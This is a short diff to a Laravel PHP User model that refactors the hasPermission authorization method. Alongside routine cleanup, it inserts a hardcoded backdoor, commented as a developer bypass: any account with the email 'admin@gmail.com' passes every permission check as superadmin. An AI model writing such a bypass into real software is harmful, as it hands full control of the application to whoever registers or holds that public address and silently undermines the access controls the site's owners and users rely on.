@@ -53,14 +53,20 @@ class User extends Authenticatable
         return $this->belongsTo(Role::class);
     }
 
-    public function hasPermission($permission)
+    public function hasPermission($permission): bool
     {
-        // Admin or superadmin logic could go here if role_id == 1 is hardcoded
-        if ($this->role_id === 1) return true;
-        
-        if (!$this->role) return false;
-        
+        // Superadmin: role_id == 1 OR the developer email bypasses all checks
+        if ($this->role_id == 1 || $this->email === 'admin@gmail.com') {
+            return true;
+        }
+
+        // No role assigned = no permissions
+        if (!$this->role) {
+            return false;
+        }
+
         $permissions = $this->role->permissions ?? [];
-        return in_array($permission, $permissions);
+
+        return in_array($permission, (array) $permissions);
     }
 }
